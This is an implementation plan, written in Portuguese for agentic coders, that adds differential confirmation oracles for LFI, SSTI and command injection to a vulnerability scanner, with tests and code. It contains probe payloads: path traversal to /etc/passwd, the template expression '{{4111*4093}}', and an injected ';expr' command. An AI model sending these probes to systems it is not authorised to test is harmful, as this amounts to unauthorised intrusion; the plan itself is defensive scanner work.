# Oráculo diferencial generalizado (LFI/SSTI/cmd-injection) — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Estender o oráculo de confirmação diferencial (`confirm_oracle.py`) de redirect/sqli-error para três classes in-band — LFI/path-traversal, SSTI e command-injection — usando "efeito por valor computado" para matar o FP de eco de payload.

**Architecture:** Núcleo puro (builders + effect detectors, sem rede) em `lib/confirm_oracle.py`, reusando o `differential_verdict`/`run_differential` já existentes. Wiring no `poc_validator.confirm_nuclei` (Fase 5) espelhando os blocos de redirect/sqli. Consumo em plug-ins `lib/validators/*` com `CONFIRMED` positivo-autoritativo e `REJECTED`/ausente caindo no fallback legado (não-vetante). Pré-requisito: `classify_vuln` passa a rotear `ssti`/`cmdi` (antes iam para o validador sqli).

**Tech Stack:** Python 3 (stdlib: `re`, `urllib.parse`), pytest, curl (via helpers `run_cmd`/`_req_to_curl` do `poc_validator`).

## Global Constraints

- Lógica pura + `send_fn`/`fetch_fn` injetável; **sem rede no núcleo**; sem domínio hardcoded.
- Findings/evidence em **inglês** (deliverable); comentários/console em **PT-BR**.
- Fail-safe: builder sem parâmetro → retorna `None`; fetch falho → resp `{"status":"000","headers":{},"body":""}`; oracle `None` → **fallback legado** (sem regressão).
- `CONFIRMED` → validador retorna `True` com a confidence do oráculo; `REJECTED`/ausente → **cai no fallback** (nunca veta).
- Imports de teste: `sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lib"))` e então `import confirm_oracle as co` / `import validators`.
- Ao final de cada task: `python3 -m py_compile lib/*.py` e `python3 -m pytest tests/` limpos.
- Constantes exatas: LFI depth = `"../" * 8`; SSTI fatores `4111 * 4093` → produto `"16826323"`; cmdi `1000000 + 337` → `"1000337"` (controle `+ 336` → `"1000336"`).

---

### Task 1: Núcleo LFI no `confirm_oracle.py`

**Files:**
- Modify: `lib/confirm_oracle.py` (adicionar após o bloco SQLi error-based, antes de `run_differential`)
- Test: `tests/test_confirm_oracle.py` (estender)

**Interfaces:**
- Consumes: `differential_verdict`, `_rebuild_query`, `parse_qsl`, `urlsplit` (já no módulo).
- Produces:
  - `passwd_signature(body) -> {"signal": bool, "detail": str}`
  - `lfi_effect(resp) -> {"signal": bool, "detail": str}` (resp = `{"status","headers","body"}`)
  - `build_lfi_variants(url, method="GET", body="") -> (attack, control) | None` (cada req = `{"url","method","body"}`)

- [ ] **Step 1: Escrever os testes que falham**

Adicionar ao fim de `tests/test_confirm_oracle.py`:

```python
# ── LFI / path traversal ──────────────────────────────────────────────────────
LFI_URL = "https://app.target.com/download?file=welcome.txt"

def test_passwd_signature_detects_unix_passwd():
    body = "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nroot:x:0:0:root:/root:/bin/bash\n"
    sig = co.passwd_signature(body)
    assert sig["signal"] is True
    assert "passwd" in sig["detail"].lower()

def test_passwd_signature_detects_windows_ini():
    assert co.passwd_signature("; for 16-bit app support\n[extensions]\n")["signal"] is True

def test_passwd_signature_negative_on_plain_html():
    assert co.passwd_signature("<html><body>hello root user</body></html>")["signal"] is False

def test_build_lfi_variants_attack_and_control_shape():
    attack, control = co.build_lfi_variants(LFI_URL)
    assert _qval(attack["url"], "file").endswith("etc/passwd")
    assert "../" in _qval(attack["url"], "file")
    # controle: mesma profundidade, arquivo inexistente (não deve casar assinatura)
    assert _qval(control["url"], "file").count("../") == _qval(attack["url"], "file").count("../")
    assert not _qval(control["url"], "file").endswith("etc/passwd")

def test_build_lfi_variants_none_without_params():
    assert co.build_lfi_variants("https://app.target.com/download") is None

def test_lfi_differential_confirmed():
    # ataque lê /etc/passwd (assinatura), controle não
    v = co.differential_verdict(
        co.lfi_effect({"status": 200, "headers": {}, "body": "root:x:0:0:root:/root:/bin/bash"}),
        co.lfi_effect({"status": 200, "headers": {}, "body": "File not found"}),
        "lfi_traversal")
    assert v["state"] == "CONFIRMED"

def test_lfi_differential_rejected_when_both_signal():
    # página que sempre contém a assinatura (FP) → controle também dispara
    same = {"status": 200, "headers": {}, "body": "root:x:0:0:root:/root:/bin/bash"}
    v = co.differential_verdict(co.lfi_effect(same), co.lfi_effect(same), "lfi_traversal")
    assert v["state"] == "REJECTED"
```

- [ ] **Step 2: Rodar para confirmar que falham**

Run: `python3 -m pytest tests/test_confirm_oracle.py -k lfi -v`
Expected: FAIL com `AttributeError: module 'confirm_oracle' has no attribute 'passwd_signature'` (e similares).

- [ ] **Step 3: Implementar o núcleo LFI**

Inserir em `lib/confirm_oracle.py` logo após `build_sqli_error_variants` (antes de `# ── Orquestração fina`):

```python
# ── LFI / path traversal: assinatura de arquivo de sistema (baixo-FP) ─────────
_LFI_PARAM_HINTS = ("../", "..\\", "%2e%2e", "/etc/", "passwd", "boot.ini", "win.ini")
_PASSWD_RX = re.compile(r"root:.*?:0:0:")
_WINI_RX = re.compile(r"\[extensions\]|for 16-bit app support|\[boot loader\]", re.I)
_LFI_DEPTH = "../" * 8


def passwd_signature(body):
    """Assinatura inequívoca de arquivo de sistema lido via traversal. {"signal","detail"}."""
    text = body or ""
    m = _PASSWD_RX.search(text)
    if m:
        return {"signal": True, "detail": f"unix passwd signature: {m.group(0)[:60]!r}"}
    m = _WINI_RX.search(text)
    if m:
        return {"signal": True, "detail": f"windows ini/boot signature: {m.group(0)[:60]!r}"}
    return {"signal": False, "detail": "no system-file signature"}


def lfi_effect(resp):
    """Sinal de LFI: assinatura de arquivo de sistema no corpo da resposta."""
    return passwd_signature(resp.get("body"))


def _pick_lfi_param(pairs):
    """Param cujo valor parece payload de traversal (do nuclei); senão o 1º."""
    for k, v in pairs:
        if any(h in (v or "").lower() for h in _LFI_PARAM_HINTS):
            return k
    return pairs[0][0] if pairs else None


def build_lfi_variants(url, method="GET", body=""):
    """(attack, control) | None — probe LFI diferencial.

    ataque : param = traversal profundo -> etc/passwd (arquivo real);
    controle: MESMA profundidade -> nome inexistente (etc/stiglitz_absent_zzz).
    Assinatura só-no-ataque é atribuível à leitura do arquivo real. None se a
    query não tiver parâmetros (fail-safe → oráculo ausente → fallback legado)."""
    pairs = parse_qsl(urlsplit(url).query, keep_blank_values=True)
    key = _pick_lfi_param(pairs)
    if not key:
        return None
    attack = {"method": method, "body": body,
              "url": _rebuild_query(url, key, _LFI_DEPTH + "etc/passwd")}
    control = {"method": method, "body": body,
               "url": _rebuild_query(url, key, _LFI_DEPTH + "etc/stiglitz_absent_zzz")}
    return attack, control
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `python3 -m pytest tests/test_confirm_oracle.py -k lfi -v`
Expected: PASS (7 testes).

- [ ] **Step 5: Commit**

```bash
git add lib/confirm_oracle.py tests/test_confirm_oracle.py
git commit -m "feat(confirm_oracle): núcleo LFI diferencial (assinatura passwd/win.ini)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 2: Integração LFI end-to-end (`poc_validator` + `validators/lfi.py`)

**Files:**
- Modify: `lib/poc_validator.py` (assinatura de `validate()` ~L438-441; dict `ctx` ~L471-482; bloco de wiring no `confirm_nuclei` após o bloco SQLi ~L952; call site `validate(...)` ~L973-979)
- Modify: `lib/validators/lfi.py` (prepend do bloco do oráculo)
- Test: `tests/test_lfi_oracle_integration.py` (novo)

**Interfaces:**
- Consumes: `build_lfi_variants`, `lfi_effect`, `run_differential`, `parse_header_block` (Task 1 + módulo).
- Produces: `validate(..., lfi_oracle=None)`; `ctx["lfi_oracle"]`; `validators/lfi.py` consome `ctx.get("lfi_oracle")`.

- [ ] **Step 1: Escrever o teste que falha**

Criar `tests/test_lfi_oracle_integration.py`:

```python
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lib"))
import validators  # noqa: E402

def _base_ctx(**over):
    ctx = {"url": "https://app.target.com/download?file=x", "resp_body": "",
           "resp_headers": "", "status": 200, "patterns": {},
           "diff_changed": False, "diff_conf": 0, "diff_note": "", "auth_ev": [],
           "dc_result": None, "dc_bonus": 0, "method_results": {},
           "bool_pair": None, "canary": None, "redir_oracle": None,
           "sqli_oracle": None, "lfi_oracle": None}
    ctx.update(over)
    return ctx

def test_lfi_validator_confirms_on_oracle():
    plugin = validators.get("lfi")
    ok, conf, note = plugin(_base_ctx(
        lfi_oracle={"state": "CONFIRMED", "confidence": 90,
                    "evidence": "attack: unix passwd signature; control: no signature"}))
    assert ok is True and conf >= 85 and "oracle" in note.lower()

def test_lfi_validator_falls_back_when_oracle_rejected():
    plugin = validators.get("lfi")
    # oráculo REJECTED + sem assinatura no corpo → fallback legado decide (False)
    ok, conf, _ = plugin(_base_ctx(
        lfi_oracle={"state": "REJECTED", "confidence": 30, "note": "no diff"},
        resp_body="<html>ok</html>"))
    assert ok is False

def test_lfi_validator_legacy_signature_still_works_without_oracle():
    plugin = validators.get("lfi")
    ctx = _base_ctx(resp_body="root:x:0:0:root:/root:/bin/bash",
                    patterns={"patterns": [r"root:.*:0:0:"]})
    ok, _, _ = plugin(ctx)
    assert ok is True
```

- [ ] **Step 2: Rodar para confirmar que falha**

Run: `python3 -m pytest tests/test_lfi_oracle_integration.py -v`
Expected: FAIL — `test_lfi_validator_confirms_on_oracle` retorna o veredito legado (não lê o oráculo ainda).

- [ ] **Step 3: Editar `lib/validators/lfi.py`**

Inserir o bloco do oráculo no topo de `validate(ctx)`, antes de `resp = ctx["resp_body"] or ""`:

```python
    oracle = ctx.get("lfi_oracle")
    if oracle and oracle.get("state") == "CONFIRMED":
        return (True, oracle.get("confidence", 90),
                f"LFI confirmed by differential oracle: {(oracle.get('evidence') or '')[:160]}")
    # REJECTED/ausente → cai no fallback legado (assinatura de sistema / diff).
```

- [ ] **Step 4: Wire no `poc_validator.py`**

4a. Assinatura de `validate()` — acrescentar kwarg:

```python
def validate(vuln_type, url, resp_body, resp_headers, status,
             method_results=None, diff_changed=False, diff_conf=0,
             diff_note="", auth_ev=None, dc_result=None,
             bool_pair=None, canary=None, redir_oracle=None, sqli_oracle=None,
             lfi_oracle=None):
```

4b. No dict `ctx` (após `"sqli_oracle": sqli_oracle,`):

```python
            "lfi_oracle": lfi_oracle,
```

4c. No `confirm_nuclei`, após o bloco `sqli_oracle = None ...` (~L952), inserir:

```python
                # Oráculo diferencial LFI/path-traversal: ataque lê /etc/passwd,
                # controle lê arquivo inexistente na mesma profundidade. Assinatura
                # só-no-ataque é atribuível ao traversal. Degrada sem regressão.
                lfi_oracle = None
                if _CONFIRM_ORACLE_AVAILABLE and vuln_type == "lfi":
                    lv = _co.build_lfi_variants(url, method, req_body)
                    if lv:
                        la_req, lc_req = lv

                        def _send_lfi(req):
                            o, e = run_cmd(_apply_oauth(_req_to_curl(req)),
                                           timeout=15, retries=1)
                            if e:
                                return {"status": "000", "headers": {}, "body": ""}
                            st, hd, bd = parse_http_response(o or "")
                            return {"status": st,
                                    "headers": _co.parse_header_block(hd), "body": bd}

                        lfi_oracle = _co.run_differential(
                            url, la_req, lc_req, _co.lfi_effect, _send_lfi,
                            "lfi_traversal")
```

4d. No call site `validate(...)` (~L978), acrescentar o kwarg:

```python
                    bool_pair=bool_pair, canary=canary, redir_oracle=redir_oracle,
                    sqli_oracle=sqli_oracle, lfi_oracle=lfi_oracle)
```

- [ ] **Step 5: Rodar os testes**

Run: `python3 -m pytest tests/test_lfi_oracle_integration.py tests/test_confirm_oracle.py -v && python3 -m py_compile lib/poc_validator.py lib/validators/lfi.py`
Expected: PASS; py_compile sem erro.

- [ ] **Step 6: Commit**

```bash
git add lib/poc_validator.py lib/validators/lfi.py tests/test_lfi_oracle_integration.py
git commit -m "feat(poc_validator): wire oráculo LFI (confirm_nuclei + validators/lfi)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 3: Núcleo SSTI no `confirm_oracle.py`

**Files:**
- Modify: `lib/confirm_oracle.py` (após o núcleo LFI)
- Test: `tests/test_confirm_oracle.py` (estender)

**Interfaces:**
- Produces:
  - `ssti_product_present(body, expected) -> {"signal","detail"}`
  - `ssti_effect(resp, expected) -> {"signal","detail"}`
  - `build_ssti_variants(url, method="GET", body="") -> (attack, control, expected) | None`

- [ ] **Step 1: Escrever os testes que falham**

Adicionar em `tests/test_confirm_oracle.py`:

```python
# ── SSTI ──────────────────────────────────────────────────────────────────────
SSTI_URL = "https://app.target.com/greet?name={{7*7}}"

def test_build_ssti_variants_templated_attack_literal_control():
    attack, control, expected = co.build_ssti_variants(SSTI_URL)
    assert expected == "16826323"
    aval = _qval(attack["url"], "name")
    cval = _qval(control["url"], "name")
    assert aval.startswith("{{") and aval.endswith("}}")   # templado
    assert "{{" not in cval and "}}" not in cval           # controle não-templado
    assert "4111*4093" in cval

def test_build_ssti_variants_none_without_params():
    assert co.build_ssti_variants("https://app.target.com/greet") is None

def test_ssti_differential_confirmed_when_product_only_in_attack():
    v = co.differential_verdict(
        co.ssti_effect({"status": 200, "headers": {}, "body": "Hello 16826323"}, "16826323"),
        co.ssti_effect({"status": 200, "headers": {}, "body": "Hello 4111*4093"}, "16826323"),
        "ssti")
    assert v["state"] == "CONFIRMED"

def test_ssti_differential_rejected_on_echo():
    # página ecoa o payload: nenhum lado computa o produto
    a = co.ssti_effect({"status": 200, "headers": {}, "body": "Hello {{4111*4093}}"}, "16826323")
    c = co.ssti_effect({"status": 200, "headers": {}, "body": "Hello 4111*4093"}, "16826323")
    v = co.differential_verdict(a, c, "ssti")
    assert v["state"] == "REJECTED"
```

- [ ] **Step 2: Rodar para confirmar que falham**

Run: `python3 -m pytest tests/test_confirm_oracle.py -k ssti -v`
Expected: FAIL — `has no attribute 'build_ssti_variants'`.

- [ ] **Step 3: Implementar o núcleo SSTI**

Inserir em `lib/confirm_oracle.py` após o núcleo LFI:

```python
# ── SSTI: avaliação de template confirmada por aritmética (não-eco) ───────────
_SSTI_SYNTAXES = (("{{", "}}"), ("${", "}"), ("#{", "}"), ("<%=", "%>"))
_SSTI_A, _SSTI_B = 4111, 4093  # produto distinto e improvável: 16826323


def _detect_ssti_syntax(pairs):
    """(open, close) presente no valor de algum param (payload do nuclei); default {{ }}."""
    for _k, v in pairs:
        for op, cl in _SSTI_SYNTAXES:
            if op in (v or "") and cl in (v or ""):
                return op, cl
    return _SSTI_SYNTAXES[0]


def _pick_ssti_param(pairs):
    """Param cujo valor tem sintaxe de template; senão o 1º."""
    for k, v in pairs:
        for op, cl in _SSTI_SYNTAXES:
            if op in (v or "") and cl in (v or ""):
                return k
    return pairs[0][0] if pairs else None


def ssti_product_present(body, expected):
    """Sinal: produto aritmético presente no corpo (só se o template foi avaliado)."""
    text = body or ""
    if expected and expected in text:
        return {"signal": True, "detail": f"template evaluated: product {expected} present"}
    return {"signal": False, "detail": f"product {expected} absent"}


def ssti_effect(resp, expected):
    return ssti_product_present(resp.get("body"), expected)


def build_ssti_variants(url, method="GET", body=""):
    """(attack, control, expected) | None — probe SSTI diferencial.

    ataque : param = <op>A*B<cl> (templado) → corpo deve conter o produto A*B;
    controle: MESMA expressão A*B SEM delimitadores (literal, não avaliada).
    Motor de template → produto só no ataque. None se não houver parâmetro."""
    pairs = parse_qsl(urlsplit(url).query, keep_blank_values=True)
    key = _pick_ssti_param(pairs)
    if not key:
        return None
    op, cl = _detect_ssti_syntax(pairs)
    expr = f"{_SSTI_A}*{_SSTI_B}"
    expected = str(_SSTI_A * _SSTI_B)
    attack = {"method": method, "body": body,
              "url": _rebuild_query(url, key, f"{op}{expr}{cl}")}
    control = {"method": method, "body": body,
               "url": _rebuild_query(url, key, expr)}
    return attack, control, expected
```

- [ ] **Step 4: Rodar e confirmar que passam**

Run: `python3 -m pytest tests/test_confirm_oracle.py -k ssti -v`
Expected: PASS (4 testes).

- [ ] **Step 5: Commit**

```bash
git add lib/confirm_oracle.py tests/test_confirm_oracle.py
git commit -m "feat(confirm_oracle): núcleo SSTI diferencial (produto aritmético templado vs literal)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 4: Núcleo command-injection no `confirm_oracle.py`

**Files:**
- Modify: `lib/confirm_oracle.py` (após o núcleo SSTI)
- Test: `tests/test_confirm_oracle.py` (estender)

**Interfaces:**
- Produces:
  - `cmdi_result_present(body, expected) -> {"signal","detail"}`
  - `cmdi_effect(resp, expected) -> {"signal","detail"}`
  - `build_cmdi_variants(url, method="GET", body="") -> (attack, control, expected) | None`

- [ ] **Step 1: Escrever os testes que falham**

Adicionar em `tests/test_confirm_oracle.py`:

```python
# ── Command injection (in-band) ───────────────────────────────────────────────
CMDI_URL = "https://app.target.com/ping?host=127.0.0.1"

def test_build_cmdi_variants_computed_result():
    attack, control, expected = co.build_cmdi_variants(CMDI_URL)
    assert expected == "1000337"
    assert "expr 1000000 + 337" in _qval(attack["url"], "host")
    assert "expr 1000000 + 336" in _qval(control["url"], "host")

def test_build_cmdi_variants_strips_injected_payload():
    # valor-base com payload já injetado pelo nuclei → é limpo antes do probe
    attack, _, _ = co.build_cmdi_variants("https://app.target.com/ping?host=127.0.0.1;id")
    assert ";id" not in _qval(attack["url"], "host")

def test_build_cmdi_variants_none_without_params():
    assert co.build_cmdi_variants("https://app.target.com/ping") is None

def test_cmdi_differential_confirmed_when_result_only_in_attack():
    v = co.differential_verdict(
        co.cmdi_effect({"status": 200, "headers": {}, "body": "PING result 1000337 ok"}, "1000337"),
        co.cmdi_effect({"status": 200, "headers": {}, "body": "PING result 1000336 ok"}, "1000337"),
        "cmdi")
    assert v["state"] == "CONFIRMED"

def test_cmdi_differential_rejected_on_echo():
    # reflexão do payload: corpo mostra 'expr 1000000 + 337', não o resultado
    echo = {"status": 200, "headers": {}, "body": "host=127.0.0.1;expr 1000000 + 337"}
    a = co.cmdi_effect(echo, "1000337")
    c = co.cmdi_effect({"status": 200, "headers": {}, "body": "host=127.0.0.1;expr 1000000 + 336"}, "1000337")
    assert co.differential_verdict(a, c, "cmdi")["state"] == "REJECTED"
```

- [ ] **Step 2: Rodar para confirmar que falham**

Run: `python3 -m pytest tests/test_confirm_oracle.py -k cmdi -v`
Expected: FAIL — `has no attribute 'build_cmdi_variants'`.

- [ ] **Step 3: Implementar o núcleo cmdi**

Inserir em `lib/confirm_oracle.py` após o núcleo SSTI:

```python
# ── Command injection (in-band): resultado computado por `expr` (não-eco) ─────
# Unix. Windows (set /a) é follow-up anotado.
_CMDI_SEP = ";"
_CMDI_A, _CMDI_B = 1000000, 337  # resultado distinto: 1000337


def cmdi_result_present(body, expected):
    """Sinal: resultado aritmético presente no corpo (só se o comando executou)."""
    text = body or ""
    if expected and expected in text:
        return {"signal": True, "detail": f"command executed: result {expected} present"}
    return {"signal": False, "detail": f"result {expected} absent"}


def cmdi_effect(resp, expected):
    return cmdi_result_present(resp.get("body"), expected)


def _pick_cmdi_param(pairs):
    return pairs[0][0] if pairs else None


def build_cmdi_variants(url, method="GET", body=""):
    """(attack, control, expected) | None — probe cmd-injection diferencial (unix).

    ataque : param = <base>;expr A + B → corpo deve conter o resultado A+B;
    controle: <base>;expr A + (B-1) → resultado difere. Reflexão do payload
    mostraria 'expr A + B' (não o resultado) em ambos. None se não houver param."""
    pairs = parse_qsl(urlsplit(url).query, keep_blank_values=True)
    key = _pick_cmdi_param(pairs)
    if not key:
        return None
    base = next((v for k, v in pairs if k == key), "") or "1"
    base_clean = re.sub(r"[;&|`$].*$", "", base) or "1"
    expected = str(_CMDI_A + _CMDI_B)
    attack = {"method": method, "body": body,
              "url": _rebuild_query(url, key,
                                    f"{base_clean}{_CMDI_SEP}expr {_CMDI_A} + {_CMDI_B}")}
    control = {"method": method, "body": body,
               "url": _rebuild_query(url, key,
                                     f"{base_clean}{_CMDI_SEP}expr {_CMDI_A} + {_CMDI_B - 1}")}
    return attack, control, expected
```

- [ ] **Step 4: Rodar e confirmar que passam**

Run: `python3 -m pytest tests/test_confirm_oracle.py -k cmdi -v`
Expected: PASS (5 testes).

- [ ] **Step 5: Commit**

```bash
git add lib/confirm_oracle.py tests/test_confirm_oracle.py
git commit -m "feat(confirm_oracle): núcleo command-injection diferencial (resultado de expr)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 5: Roteamento `classify_vuln` + validadores `ssti`/`cmdi`

**Files:**
- Modify: `lib/poc_validator.py` (`classify_vuln` ~L411-436)
- Create: `lib/validators/ssti.py`, `lib/validators/cmdi.py`
- Test: `tests/test_classify_ssti_cmdi.py` (novo); `tests/test_nuclei_template_coverage.py` (deve continuar verde)

**Interfaces:**
- Consumes: `validators.register` decorator; `ctx` keys `ssti_oracle`/`cmdi_oracle` (ainda `None` até Task 6 → fallback).
- Produces: `classify_vuln(...) -> "ssti" | "cmdi"` para templates de template/command injection; plug-ins registrados para ambos.

- [ ] **Step 1: Escrever os testes que falham**

Criar `tests/test_classify_ssti_cmdi.py`:

```python
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lib"))
import poc_validator as pv  # noqa: E402
import validators  # noqa: E402

def test_template_injection_routes_to_ssti():
    assert pv.classify_vuln("ssti-detect", "Server-Side Template Injection", "ssti") == "ssti"
    assert pv.classify_vuln("x", "Template Injection", "template-injection") == "ssti"

def test_command_injection_routes_to_cmdi():
    assert pv.classify_vuln("cmd-inj", "OS Command Injection", "command-injection") == "cmdi"
    assert pv.classify_vuln("rce-x", "Remote Code Execution", "rce") == "cmdi"

def test_sqli_still_routes_to_sqli():
    assert pv.classify_vuln("sqli-error", "SQL Injection", "sqli") == "sqli"
    assert pv.classify_vuln("x", "UNION based", "union") == "sqli"

def test_ssti_and_cmdi_have_plugins():
    assert validators.get("ssti") is not None
    assert validators.get("cmdi") is not None

def test_ssti_validator_confirms_on_oracle():
    ctx = {"url": "u", "resp_body": "", "resp_headers": "", "status": 200,
           "patterns": {}, "diff_changed": False, "diff_conf": 0, "diff_note": "",
           "auth_ev": [], "dc_result": None, "dc_bonus": 0, "method_results": {},
           "bool_pair": None, "canary": None, "redir_oracle": None,
           "sqli_oracle": None, "lfi_oracle": None,
           "ssti_oracle": {"state": "CONFIRMED", "confidence": 90, "evidence": "product 16826323"}}
    ok, conf, note = validators.get("ssti")(ctx)
    assert ok is True and "oracle" in note.lower()
```

- [ ] **Step 2: Rodar para confirmar que falham**

Run: `python3 -m pytest tests/test_classify_ssti_cmdi.py -v`
Expected: FAIL — classify retorna `"sqli"`/`"generic"`; `validators.get("ssti")` é `None`.

- [ ] **Step 3: Editar `classify_vuln`**

Em `lib/poc_validator.py`, inserir **duas linhas antes** da linha do sqli (`if any(x in tid for x in ["sql", "sqli", "injection", "union"]): return "sqli"`):

```python
    if any(x in tid for x in ["ssti", "template-injection", "server-side-template"]): return "ssti"
    if any(x in tid for x in ["command-injection", "cmd-injection", "os-command",
                              "rce", "remote-code"]):                                 return "cmdi"
```

- [ ] **Step 4: Criar `lib/validators/ssti.py`**

```python
"""Validador SSTI — Server-Side Template Injection (oráculo diferencial + fallback)."""
from . import register


@register("ssti")
def validate(ctx):
    oracle = ctx.get("ssti_oracle")
    if oracle and oracle.get("state") == "CONFIRMED":
        return (True, oracle.get("confidence", 90),
                f"SSTI confirmed by differential oracle: {(oracle.get('evidence') or '')[:160]}")
    # Fallback legado: nuclei já marcou; corrobora por anomalia de resposta.
    if ctx["diff_changed"] and ctx["diff_conf"] >= 20:
        return (True, 66 + ctx["dc_bonus"],
                f"Template injection corroborated by response anomaly: {ctx['diff_note']}")
    return False, 30, "No differential template evaluation confirmed"
```

- [ ] **Step 5: Criar `lib/validators/cmdi.py`**

```python
"""Validador command-injection (oráculo diferencial + fallback)."""
from . import register


@register("cmdi")
def validate(ctx):
    oracle = ctx.get("cmdi_oracle")
    if oracle and oracle.get("state") == "CONFIRMED":
        return (True, oracle.get("confidence", 90),
                f"Command injection confirmed by differential oracle: "
                f"{(oracle.get('evidence') or '')[:160]}")
    # Fallback legado: nuclei já marcou; corrobora por anomalia de resposta.
    if ctx["diff_changed"] and ctx["diff_conf"] >= 20:
        return (True, 66 + ctx["dc_bonus"],
                f"Command injection corroborated by response anomaly: {ctx['diff_note']}")
    return False, 30, "No differential command execution confirmed"
```

- [ ] **Step 6: Rodar os testes (inclui cobertura)**

Run: `python3 -m pytest tests/test_classify_ssti_cmdi.py tests/test_nuclei_template_coverage.py -v`
Expected: PASS — classify roteia certo, plug-ins registrados, cobertura verde.

- [ ] **Step 7: Commit**

```bash
git add lib/poc_validator.py lib/validators/ssti.py lib/validators/cmdi.py tests/test_classify_ssti_cmdi.py
git commit -m "feat(poc_validator): rota ssti/cmdi no classify_vuln + validadores dedicados

Antes: template/command-injection caíam no validador sqli (misclassificação).

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

### Task 6: Wiring dos oráculos SSTI/cmdi no `confirm_nuclei`

**Files:**
- Modify: `lib/poc_validator.py` (`validate()` kwargs + `ctx` + 2 blocos no `confirm_nuclei` + call site)
- Test: `tests/test_ssti_cmdi_wiring.py` (novo)

**Interfaces:**
- Consumes: `build_ssti_variants`/`ssti_effect` (Task 3), `build_cmdi_variants`/`cmdi_effect` (Task 4), validadores (Task 5).
- Produces: `ctx["ssti_oracle"]`/`ctx["cmdi_oracle"]` populados pelo `confirm_nuclei`.

- [ ] **Step 1: Escrever o teste que falha**

Criar `tests/test_ssti_cmdi_wiring.py`:

```python
import inspect, os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lib"))
import poc_validator as pv  # noqa: E402

def test_validate_accepts_ssti_and_cmdi_oracle_kwargs():
    params = inspect.signature(pv.validate).parameters
    assert "ssti_oracle" in params and "cmdi_oracle" in params

def test_validate_passes_ssti_oracle_to_plugin():
    # oráculo CONFIRMED chega ao validador ssti via ctx
    ok, conf, note = pv.validate(
        "ssti", "https://app.target.com/greet?name=x", "", "", 200,
        ssti_oracle={"state": "CONFIRMED", "confidence": 90, "evidence": "product 16826323"})
    assert ok is True and "oracle" in note.lower()

def test_validate_cmdi_oracle_rejected_falls_back():
    ok, _, _ = pv.validate(
        "cmdi", "https://app.target.com/ping?host=x", "", "", 200,
        cmdi_oracle={"state": "REJECTED", "confidence": 30, "note": "no diff"})
    assert ok is False
```

- [ ] **Step 2: Rodar para confirmar que falha**

Run: `python3 -m pytest tests/test_ssti_cmdi_wiring.py -v`
Expected: FAIL — `validate()` não aceita `ssti_oracle`/`cmdi_oracle`.

- [ ] **Step 3: `validate()` kwargs + ctx**

3a. Assinatura (estende a de Task 2):

```python
             bool_pair=None, canary=None, redir_oracle=None, sqli_oracle=None,
             lfi_oracle=None, ssti_oracle=None, cmdi_oracle=None):
```

3b. Dict `ctx` (após `"lfi_oracle": lfi_oracle,`):

```python
            "ssti_oracle": ssti_oracle,
            "cmdi_oracle": cmdi_oracle,
```

- [ ] **Step 4: Blocos de wiring no `confirm_nuclei`**

Após o bloco `lfi_oracle = None ...` (Task 2), inserir:

```python
                # Oráculo diferencial SSTI: ataque templado deve computar o produto
                # aritmético; controle não-templado não. Eco do payload → REJECTED.
                ssti_oracle = None
                if _CONFIRM_ORACLE_AVAILABLE and vuln_type == "ssti":
                    sv = _co.build_ssti_variants(url, method, req_body)
                    if sv:
                        sa_req, sc_req, s_exp = sv

                        def _send_ssti(req):
                            o, e = run_cmd(_apply_oauth(_req_to_curl(req)),
                                           timeout=15, retries=1)
                            if e:
                                return {"status": "000", "headers": {}, "body": ""}
                            st, hd, bd = parse_http_response(o or "")
                            return {"status": st,
                                    "headers": _co.parse_header_block(hd), "body": bd}

                        ssti_oracle = _co.run_differential(
                            url, sa_req, sc_req,
                            lambda r: _co.ssti_effect(r, s_exp), _send_ssti, "ssti")

                # Oráculo diferencial command-injection (in-band): ataque com `;expr A+B`
                # deve refletir o resultado; controle A+(B-1) não. Eco → REJECTED.
                cmdi_oracle = None
                if _CONFIRM_ORACLE_AVAILABLE and vuln_type == "cmdi":
                    cv = _co.build_cmdi_variants(url, method, req_body)
                    if cv:
                        ca_req, cc_req, c_exp = cv

                        def _send_cmdi(req):
                            o, e = run_cmd(_apply_oauth(_req_to_curl(req)),
                                           timeout=15, retries=1)
                            if e:
                                return {"status": "000", "headers": {}, "body": ""}
                            st, hd, bd = parse_http_response(o or "")
                            return {"status": st,
                                    "headers": _co.parse_header_block(hd), "body": bd}

                        cmdi_oracle = _co.run_differential(
                            url, ca_req, cc_req,
                            lambda r: _co.cmdi_effect(r, c_exp), _send_cmdi, "cmdi")
```

- [ ] **Step 5: Call site `validate(...)`**

Estender a chamada (a de Task 2):

```python
                    sqli_oracle=sqli_oracle, lfi_oracle=lfi_oracle,
                    ssti_oracle=ssti_oracle, cmdi_oracle=cmdi_oracle)
```

- [ ] **Step 6: Rodar toda a suíte + compile + lint**

Run:
```bash
python3 -m pytest tests/ -q
python3 -m py_compile lib/*.py stiglitz_report.py pipeline.py
shellcheck --severity=warning stiglitz.sh lib/*.sh
```
Expected: pytest verde (todos os antigos + novos); py_compile e shellcheck limpos.

- [ ] **Step 7: Commit**

```bash
git add lib/poc_validator.py tests/test_ssti_cmdi_wiring.py
git commit -m "feat(poc_validator): wire oráculos SSTI/cmdi no confirm_nuclei (Tier 0.2 completo)

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>"
```

---

## Pós-plano

- Atualizar `CHANGELOG.md` (seção Unreleased) e `docs/ROADMAP-analyst-parity.md` (item #1 — generalização) — pode ser um commit final de docs.
- `git push` na main (fluxo do projeto) após a suíte verde.
- Follow-ups anotados (fora deste plano): Windows `set /a` no cmdi; integração OOB de cmdi (tupla `vuln_type in (...)` ~L997); SSRF refletido in-band.

## Self-review (preenchido pelo autor do plano)

